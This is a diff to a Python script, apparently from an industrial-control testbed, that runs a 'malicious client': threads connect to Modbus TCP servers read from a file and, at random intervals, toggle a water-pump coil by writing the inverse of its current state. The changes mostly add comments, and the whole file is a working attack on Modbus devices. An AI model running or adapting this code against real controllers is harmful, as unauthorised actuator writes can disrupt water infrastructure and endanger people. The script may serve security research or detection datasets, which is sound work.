@@ -5,10 +5,15 @@ import random
 from datetime import datetime
 from pyModbusTCP.client import ModbusClient
 
+# Register to maliciously modify
 WATER_PUMP_ADDR = 0
+
+# file path to Modbus TCP servers
 file_path = 'ModbusServers.txt'
-random.seed(int(datetime.now().timestamp()))
+
+# define log file
 logging.basicConfig(level=logging.INFO, filename="/var/log/OT/MaliciousClient.log", filemode="w", format='%(asctime)s - %(levelname)s - %(message)s')
+random.seed(int(datetime.now().timestamp()))
 
 class Session(threading.Thread):
     def __init__(self,server_ip,server_port,unit_id):
@@ -33,20 +38,20 @@ class Session(threading.Thread):
         self.connect()
         while True:
             try:
-                if self.client.is_open: # check if server is running
-                    time_to_att = random.randrange(1,60)
+                if self.client.is_open:                                                                                                    # check if server is running
+                    time_to_att = random.randrange(1,60)                                                                                   # pick a random time to launch the attack
                     print(f"Malicious Client attack on {self.server_ip}:{self.server_port} launches in {time_to_att} seconds")
                     logging.info(f"Malicious Client attack on {self.server_ip}:{self.server_port} launches in {time_to_att} seconds")
                     time.sleep(time_to_att)
-                    water_pump_current = self.client.read_coils(WATER_PUMP_ADDR,1)[0]
-                    if self.client.write_single_coil(WATER_PUMP_ADDR,water_pump_current ^ 1) is not True:
+                    water_pump_current = self.client.read_coils(WATER_PUMP_ADDR,1)[0]                                                      # read current water pump coil status
+                    if self.client.write_single_coil(WATER_PUMP_ADDR,water_pump_current ^ 1) is not True:                                  # water_pump_status = cuurent XOR 1
                         logging.warn(f"couldn't write a single coil to {self.server_ip}:{self.server_port}")
                     else:
                         print(f"{datetime.now().isoformat()} : write value {water_pump_current^1} to {self.server_ip} water pump")
                         logging.info(f"write value {water_pump_current^1} to {self.server_ip} water pump")
 
                 else:
-                    self.connect() # try to reconnect server
+                    self.connect()                                                                                                         # try to reconnect server
 
             except Exception as e:
                 logging.error(f"{e}")
@@ -61,14 +66,14 @@ def start_modbus_client(file_path):
     for line in f:
         parts = line.split()
         if len(parts) == 3:
-            servers_list.append((parts[1],int(parts[2]))) # append (ip_address, unit_id)
+            servers_list.append((parts[1],int(parts[2])))                                                                                  # append (ip_address, unit_id)
     print(servers_list)
     sessions = [Session(ip,502,unit_id) for (ip,unit_id) in servers_list]
     for session in sessions:
-        session.start()
+        session.start()                                                                                                                    # start session as a thread
 
     for session in sessions:
-        session.join()
+        session.join()                                                                                                                     # join thread when done
 
 if __name__ == "__main__":
     start_modbus_client(file_path)
